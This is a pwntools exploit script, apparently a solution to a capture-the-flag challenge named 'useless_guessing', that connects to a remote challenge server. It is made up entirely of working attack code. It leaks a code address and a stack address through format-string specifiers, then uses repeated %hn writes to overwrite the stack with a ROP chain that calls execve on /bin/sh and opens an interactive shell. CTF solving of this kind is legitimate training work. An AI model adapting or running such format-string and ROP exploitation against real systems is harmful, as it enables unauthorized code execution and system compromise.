from pwn import *

elf = context.binary = ELF('./useless_guessing')
context.terminal = ()
if args.REMOTE:
    p = remote('uselessguessing.challs.olicyber.it', 38071)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b chall
        c
        b log_event
        ignore 15
        ''')
        # b log_event
else:
    p = elf.process()

p.sendlineafter(b'?\n',f'%25$ln.%41$p.%36$p')
p.sendafter(b'?\n',bytes.fromhex('1c'))
chars_printed = p.recvuntil(b': ')
chars_printed = len(chars_printed) + 5
p.recvuntil(b'0x')
main_addr = int(p.recvuntil(b'.',drop=True).strip(),16)
log.info(f'main_addr: {hex(main_addr)}')
stack_leak = int(p.recvline().strip(),16)
elf.address = main_addr - elf.symbols['main']
overwrite = (elf.address + 0x89A2) & 0xffff
padding =b'a'*  (8- len(f"[%ld] %s: %{overwrite-0x1c}c%28$hn") % 8)
payload = f'%{overwrite - 0x1c - 3}c%28$hn'.encode().strip()+ padding + b'aa' +p64((stack_leak - 0x78)) 
p.sendafter(b'?\n',payload.strip())
def calc_padding_rop(addr):
    strlen = len(f"[%ld] %s: %{addr-0x1c}c%28$hn")
    pad = b'a' *  (8-(strlen % 8))
    return pad
shaddr = elf.search("sh\x00").__next__()
gadg = {

    "rdi": elf.address + int("917f",16),
    "shaddr": stack_leak-56,
    "rsi": elf.address + 0x111ee,
    "0": stack_leak+120,
    "rax": elf.address + int("574f7",16),
    "0x3b": 0x003b00370037,
    "syscall": elf.address + int("21ec6",16)

}
l_gadg = ["rdi","shaddr","rsi","0","rax","0x3b","syscall"]
for i in range(len(l_gadg)):
    idx = l_gadg[i]
    for j in range(0,48,16):
        payload_rop = f"%{((gadg[idx] >> j) & 0xffff) - 0x1c}c%28$hn".encode() + calc_padding_rop((gadg[idx]>>j) & 0xffff) +b'aa'+ p64(stack_leak+8 + j//8 + i*8)
        if idx == "0x3b":
            payload_rop = f"%{0x3b - 0x1c}c%28$ln".encode() + b'a'*6 + p64(stack_leak+8 + j//8 + i*8)


        p.sendafter(b'?\n',payload_rop.strip())
        p.sendafter(b'?\n',bytes.fromhex('1c')+b'\0' + b'a'*6 + b'/bin/sh\x00')
        p.sendafter(b'?\n',payload.strip())
        if idx == "0x3b":
            break

        # p.interactive()
payload_rop = f"%{0xFFE4}c%28$hn".encode() + calc_padding_rop(0xFFE4) +b'aa'+ p64(stack_leak+8 + 6 + (len(l_gadg)-1)*8)
p.sendafter(b'?\n',payload_rop.strip())
p.sendafter(b'?\n',bytes.fromhex('1c')+b'\0' + b'a'*6 + b'/bin/sh\x00')
p.sendafter(b'?\n',payload.strip())

p.sendafter(b'?\n',b"zazaman")
p.sendafter(b'?\n',bytes.fromhex('1c')+b'\0' + b'a'*6 + b'/bin/sh\x00')

p.sendafter(b'?\n',"zazaman")



p.interactive()
